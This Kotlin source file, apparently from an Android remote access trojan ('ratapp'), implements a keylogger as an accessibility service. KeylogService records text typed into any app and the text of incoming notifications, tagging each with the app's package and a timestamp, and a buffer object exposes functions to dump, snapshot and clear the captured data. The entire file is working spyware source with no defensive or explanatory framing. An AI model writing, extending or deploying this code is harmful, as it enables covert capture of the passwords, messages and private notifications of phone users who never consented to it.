package com.ratio.ratapp

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.provider.Settings
import android.text.TextUtils
import android.view.accessibility.AccessibilityEvent

object KeylogBuffer {
    @Volatile var enabled = false
    val logs = mutableListOf<Map<String, Any?>>()
    val notifications = mutableListOf<Map<String, Any?>>()
    private val lock = Any()

    fun add(pkg: String, text: String) {
        if (!enabled) return
        synchronized(lock) {
            logs.add(mapOf("pkg" to pkg, "text" to text, "ts" to System.currentTimeMillis()))
            if (logs.size > 1000) logs.removeAt(0)
        }
    }

    fun addNotif(pkg: String, title: String, text: String) {
        synchronized(lock) {
            notifications.add(mapOf(
                "pkg" to pkg, "title" to title, "text" to text,
                "ts" to System.currentTimeMillis()
            ))
            if (notifications.size > 500) notifications.removeAt(0)
        }
    }

    fun dump(): List<Map<String, Any?>> = synchronized(lock) { logs.toList() }
    fun dumpNotifs(): List<Map<String, Any?>> = synchronized(lock) { notifications.toList() }
    fun clear() { synchronized(lock) { logs.clear() } }
}

class KeylogService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: ""
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val txt = event.text.joinToString(" ")
                if (!TextUtils.isEmpty(txt)) KeylogBuffer.add(pkg, txt)
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                val title = event.text.joinToString(" ")
                KeylogBuffer.addNotif(pkg, "", title)
            }
        }
    }
    override fun onInterrupt() {}

    companion object {
        fun setEnabled(ctx: Context, on: Boolean) { KeylogBuffer.enabled = on }
        fun dump() = KeylogBuffer.dump()
        fun notificationsSnapshot() = KeylogBuffer.dumpNotifs()
        fun clear() = KeylogBuffer.clear()
    }
}